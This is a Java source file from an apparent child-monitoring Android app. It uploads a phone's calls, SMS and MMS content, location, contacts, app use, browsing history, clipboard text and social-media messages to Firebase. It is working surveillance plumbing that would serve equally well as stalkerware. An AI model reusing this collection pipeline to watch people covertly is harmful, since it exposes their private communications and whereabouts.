package com.childmonitorai;

import static android.content.ContentValues.TAG;

import android.util.Log;

import com.google.android.gms.tasks.Tasks;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.android.gms.tasks.Task;

import java.util.Date;
import java.util.Locale;
import java.text.SimpleDateFormat;
import java.util.HashMap;
import java.util.Map;
import java.util.UUID;

public class DatabaseHelper {

    private static DatabaseReference database;

    public DatabaseHelper() {
        // Firebase initialization
        database = FirebaseDatabase.getInstance().getReference("users");
    }

    // Helper method to avoid repetition of paths
    private static DatabaseReference getPhoneDataReference(String userId, String phoneModel, String dataType, String uniqueId, String date) {
        return database.child(userId)
                .child("phones")
                .child(phoneModel)
                .child(dataType)
                .child(date)
                .child(uniqueId);
    }

    // Upload all call data grouped by date and check for duplication of recent data only
    public void uploadCallDataByDate(String userId, String phoneModel, CallData callData, String uniqueCallId, String callDate) {
        DatabaseReference callRef = getPhoneDataReference(userId, phoneModel, "calls", uniqueCallId, callDate);

        callRef.get().addOnCompleteListener(task -> {
            if (task.isSuccessful() && !task.getResult().exists()) {
                Map<String, Object> callMap = new HashMap<>();
                callMap.put("date", callData.getDate());
                callMap.put("duration", callData.getCallDuration());
                callMap.put("number", callData.getPhoneNumber());
                callMap.put("type", callData.getCallType());
                callMap.put("timestamp", callData.getTimestamp());

                callRef.setValue(callMap).addOnSuccessListener(aVoid ->
                                Log.d("DatabaseHelper", "Call data uploaded successfully."))
                        .addOnFailureListener(e ->
                                Log.e("DatabaseHelper", "Failed to upload call data: " + e.getMessage()));
            } else {
                Log.d("DatabaseHelper", "Duplicate call data found for recent call, skipping upload.");
            }
        }).addOnFailureListener(e -> Log.e("DatabaseHelper", "Error checking for duplication: " + e.getMessage()));
    }

    // Upload all SMS data grouped by date and check for duplication of recent SMS only
    public void uploadSMSDataByDate(String userId, String phoneModel, SMSData smsData, String uniqueSMSId, String smsDate) {
        DatabaseReference smsRef = getPhoneDataReference(userId, phoneModel, "sms", uniqueSMSId, smsDate);

        smsRef.get().addOnCompleteListener(task -> {
            if (task.isSuccessful() && !task.getResult().exists()) {
                Map<String, Object> smsMap = new HashMap<>();
                smsMap.put("type", smsData.getType());
                smsMap.put("address", smsData.getAddress());
                smsMap.put("body", smsData.getBody());
                smsMap.put("timestamp", smsData.getTimestamp());
                smsMap.put("date", smsData.getDate());
                smsMap.put("contactName", smsData.getContactName()); // Include contact name

                smsRef.setValue(smsMap).addOnSuccessListener(aVoid ->
                                Log.d("DatabaseHelper", "SMS data uploaded successfully."))
                        .addOnFailureListener(e ->
                                Log.e("DatabaseHelper", "Failed to upload SMS data: " + e.getMessage()));
            } else {
                Log.d("DatabaseHelper", "Duplicate SMS data found for recent SMS, skipping upload.");
            }
        }).addOnFailureListener(e -> Log.e("DatabaseHelper", "Error accessing Firebase: " + e.getMessage()));
    }

    // Upload MMS data grouped by date
    public void uploadMMSDataByDate(String userId, String phoneModel, MMSData mmsData, String uniqueMMSId, String mmsDate) {
        DatabaseReference mmsRef = getPhoneDataReference(userId, phoneModel, "mms", uniqueMMSId, mmsDate);

        mmsRef.get().addOnCompleteListener(task -> {
            if (task.isSuccessful() && !task.getResult().exists()) {
                Map<String, Object> mmsMap = new HashMap<>();
                mmsMap.put("subject", mmsData.getSubject());
                mmsMap.put("date", mmsData.getDate());
                mmsMap.put("senderAddress", mmsData.getSenderAddress());
                mmsMap.put("content", mmsData.getContent());

                mmsRef.setValue(mmsMap).addOnSuccessListener(aVoid ->
                                Log.d("DatabaseHelper", "MMS data uploaded successfully."))
                        .addOnFailureListener(e ->
                                Log.e("DatabaseHelper", "Failed to upload MMS data: " + e.getMessage()));
            } else {
                Log.d("DatabaseHelper", "Duplicate MMS data found for recent MMS, skipping upload.");
            }
        }).addOnFailureListener(e -> Log.e("DatabaseHelper", "Error checking for duplication: " + e.getMessage()));
    }

    // Upload location data
    public void uploadLocationDataByDate(String userId, String phoneModel, Map<String, Object> locationData, String uniqueLocationId, String locationDate) {
        String sanitizedLocationId = sanitizePath(uniqueLocationId);
        DatabaseReference locationRef = getPhoneDataReference(userId, phoneModel, "location", sanitizedLocationId, locationDate);

        // Fetch existing data to avoid duplicates
        locationRef.get().addOnCompleteListener(task -> {
            if (task.isSuccessful() && !task.getResult().exists()) {
                // If no existing data, create the data map and upload
                locationRef.setValue(locationData)
                        .addOnSuccessListener(aVoid -> Log.d("DatabaseHelper", "Location data uploaded successfully."))
                        .addOnFailureListener(e -> Log.e("DatabaseHelper", "Failed to upload location data: " + e.getMessage()));
            } else {
                Log.d("DatabaseHelper", "Duplicate location data found for the same date, skipping upload.");
            }
        }).addOnFailureListener(e -> Log.e("DatabaseHelper", "Error accessing Firebase: " + e.getMessage()));
    }

    // Upload contact data
    public void uploadContactData(String userId, String phoneModel, ContactData contactData, String uniqueContactId) {
        DatabaseReference contactRef = getPhoneDataReference(userId, phoneModel, "contacts", uniqueContactId, "");

        contactRef.get().addOnCompleteListener(task -> {
            if (task.isSuccessful() && task.getResult().exists()) {
                // Contact exists, meaning it's an update
                ContactData existingContact = task.getResult().getValue(ContactData.class);
                if (existingContact != null) {
                    // Set the original name before modification
                    contactData.setNameBeforeModification(existingContact.getName());
                }
                // Update the last modified time
                contactData.setLastModifiedTime(System.currentTimeMillis());
            } else {
                // It's a new contact, so set the creation time
                contactData.setCreationTime(System.currentTimeMillis());
            }

            // Upload the contact data with the appropriate timestamps
            contactRef.setValue(contactData)
                    .addOnCompleteListener(uploadTask -> {
                        if (uploadTask.isSuccessful()) {
                            Log.d("DatabaseHelper", "Contact data uploaded successfully.");
                        } else {
                            Log.e("DatabaseHelper", "Error uploading contact data: " + uploadTask.getException().getMessage());
                        }
                    });
        });
    }

    // Upload app data
    public void uploadAppData(String userId, String phoneModel, String uniqueKey, Map<String, Object> appMap) {
        DatabaseReference appRef = getPhoneDataReference(userId, phoneModel, "apps", uniqueKey, "");

        appRef.get().addOnCompleteListener(task -> {
            if (task.isSuccessful() && !task.getResult().exists()) {
                appRef.setValue(appMap).addOnSuccessListener(aVoid ->
                                Log.d("DatabaseHelper", "App data uploaded successfully."))
                        .addOnFailureListener(e ->
                                Log.e("DatabaseHelper", "Failed to upload app data: " + e.getMessage()));
            } else {
                Log.d("DatabaseHelper", "Duplicate app data found, skipping upload.");
            }
        }).addOnFailureListener(e -> Log.e("DatabaseHelper", "Error checking for duplication: " + e.getMessage()));
    }

    public Task<Void> uploadWebVisitDataByDate(String userId, String phoneModel, WebVisitData visitData) {
        // Generate unique ID using timestamp and a random string
        String timestamp = String.valueOf(visitData.getTimestamp());
        String randomId = UUID.randomUUID().toString();  // Directly generate the random string
        String uniqueKey = timestamp + "_" + randomId;  // Unique ID based on timestamp and random ID

        // Format the date for the visit
        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault());
        String date = dateFormat.format(new Date(visitData.getTimestamp()));

        // Reference to the web visit data in Firebase, stored date-wise
        DatabaseReference webRef = database.child(userId)
                .child("phones")
                .child(phoneModel)
                .child("web_visits")
                .child(date) // Store data under the date
                .child(uniqueKey); // Use unique key for each visit

        // Create a map to store the web visit data
        Map<String, Object> webMap = new HashMap<>();
        webMap.put("url", visitData.getUrl());
        webMap.put("title", visitData.getTitle());
        webMap.put("timestamp", visitData.getTimestamp());

        // Upload the data
        return webRef.setValue(webMap)
                .addOnSuccessListener(aVoid -> Log.d("DatabaseHelper", "Web visit data uploaded successfully."))
                .addOnFailureListener(e -> Log.e("DatabaseHelper", "Failed to upload web visit data: " + e.getMessage()));
    }


    public void uploadAppUsageDataByDate(String userId, String phoneModel, AppUsageData appUsageData) {

        String sanitizedPackageName = sanitizePath(appUsageData.getPackageName());

        // Get the formatted date (yyyy-MM-dd)
        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault());
        String date = dateFormat.format(new Date(appUsageData.getTimestamp()));

        // Reference to the Firebase node
        DatabaseReference usageRef = database.child(userId)
                .child("phones")
                .child(phoneModel)
                .child("app_usage")
                .child(date)
                .child(sanitizedPackageName); // Use package name as unique ID for the day

        // Fetch existing data from Firebase
        usageRef.get().addOnSuccessListener(dataSnapshot -> {
            long existingDuration = 0;

            if (dataSnapshot.exists() && dataSnapshot.hasChild("usage_duration")) {
                // Retrieve the current duration from Firebase
                existingDuration = dataSnapshot.child("usage_duration").getValue(Long.class);
            }

            // Add the new duration to the existing duration
            long updatedDuration = existingDuration + appUsageData.getUsageDuration();

            // Prepare the updated data
            Map<String, Object> appUsageMap = new HashMap<>();
            appUsageMap.put("package_name", appUsageData.getPackageName());
            appUsageMap.put("usage_duration", updatedDuration);
            appUsageMap.put("timestamp", appUsageData.getTimestamp());
            appUsageMap.put("date", date);

            // Upload the updated data to Firebase
            usageRef.setValue(appUsageMap)
                    .addOnSuccessListener(aVoid -> Log.d(TAG, "App usage data updated successfully."))
                    .addOnFailureListener(e -> Log.e(TAG, "Failed to update app usage data: " + e.getMessage()));
        }).addOnFailureListener(e -> Log.e(TAG, "Failed to fetch existing data: " + e.getMessage()));
    }

    public static void uploadClipboardDataByDate(String userId, String phoneModel, ClipboardData clipboardData) {
        String date = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(new Date());
        DatabaseReference ref = FirebaseDatabase.getInstance().getReference("users")
                .child(userId)
                .child("phones")
                .child(phoneModel)
                .child("clipboard")
                .child(date);

        String key = ref.push().getKey();
        if (key != null) {
            // Create a map for the clipboard data to be uploaded
            Map<String, Object> clipboardMap = new HashMap<>();
            clipboardMap.put("content", clipboardData.getContent());
            clipboardMap.put("timestamp", clipboardData.getTimestamp());

            // Upload the clipboard data to Firebase
            ref.child(key).setValue(clipboardMap)
                    .addOnSuccessListener(aVoid -> Log.d("DatabaseHelper", "Clipboard data uploaded successfully."))
                    .addOnFailureListener(e -> Log.e("DatabaseHelper", "Failed to upload clipboard data: " + e.getMessage()));
        } else {
            Log.e("DatabaseHelper", "Failed to generate database key");
        }
    }

    public void uploadSocialMessageData(String userId, String phoneModel, MessageData messageData, String uniqueMessageId, String messageDate, String platform) {
        // Adjusting the call to getPhoneDataReference to match the expected number of arguments
        DatabaseReference messageRef = database.child(userId)
                .child("phones")
                .child(phoneModel)
                .child("social_media_messages")
                .child(messageDate) // Group by date
                .child(platform) // Group by platform
                .child(uniqueMessageId); // Use unique ID for each message

        messageRef.get().addOnCompleteListener(task -> {
            if (task.isSuccessful() && !task.getResult().exists()) {
                Map<String, Object> messageMap = new HashMap<>();
                messageMap.put("sender", messageData.getSender());
                messageMap.put("receiver", messageData.getReceiver());
                messageMap.put("message", messageData.getMessage());
                messageMap.put("timestamp", messageData.getTimestamp());
                messageMap.put("direction", messageData.getDirection());
                messageMap.put("platform", platform);

                // Set the value under the social_media_messages node
                messageRef.setValue(messageMap).addOnSuccessListener(aVoid -> {
                            Log.d("DatabaseHelper", platform + " message data uploaded successfully.");
                        })
                        .addOnFailureListener(e -> {
                            Log.e("DatabaseHelper", "Failed to upload " + platform + " message data: " + e.getMessage());
                        });
            } else {
                Log.d("DatabaseHelper", "Duplicate " + platform + " message data found, skipping upload.");
            }
        }).addOnFailureListener(e -> Log.e("DatabaseHelper", "Error checking for duplication: " + e.getMessage()));
    }



    // Helper function to sanitize paths and remove invalid characters
    String sanitizePath(String originalPath) {
        return originalPath.replaceAll("[.#$\\[\\]]", "_");
    }
}
